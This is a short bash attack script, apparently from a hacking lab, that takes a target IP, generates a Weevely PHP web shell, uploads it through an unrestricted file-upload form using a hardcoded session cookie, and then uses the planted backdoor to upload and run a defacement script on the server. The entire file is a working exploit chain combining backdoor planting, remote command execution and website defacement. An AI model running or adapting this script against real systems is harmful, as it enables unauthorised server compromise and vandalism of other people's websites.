#!/usr/bin/env bash

if [[ $# -lt 1 ]]; then
  echo "Usage: $0 <target ip>"
  exit
fi

URL="http://$1"
TARGET="$URL/upload.php"
WEEVELY="/home/debian-attacker/weevely3/weevely.py"

echo "Generating backdoor named hello.php with password foo..."
$WEEVELY generate foo hello.php
echo "Payload done."

echo "Uploading backdoor..."
result=$(curl --location --request POST $TARGET \
--header 'Cookie: PHPSESSID=dnbsv2ol6um1huo11a1v46n9u5' \
--form 'uploadedFile=@hello.php' \
--form 'uploadBtn=Upload')

# echo $result

if [[ $result == *"File was successfully uploaded"* ]]; then
  echo "Upload done."
  uploadedfile=$(echo $result | egrep -o 'File was successfully uploaded to .+.php' | cut -d "/" -f5)
  echo $uploadedfile
  $WEEVELY $URL/uploaded_files/$uploadedfile foo "file_upload defacing.sh script.sh"
  $WEEVELY $URL/uploaded_files/$uploadedfile foo "bash script.sh"
else
  echo "Couldn't upload file to web target."
fi
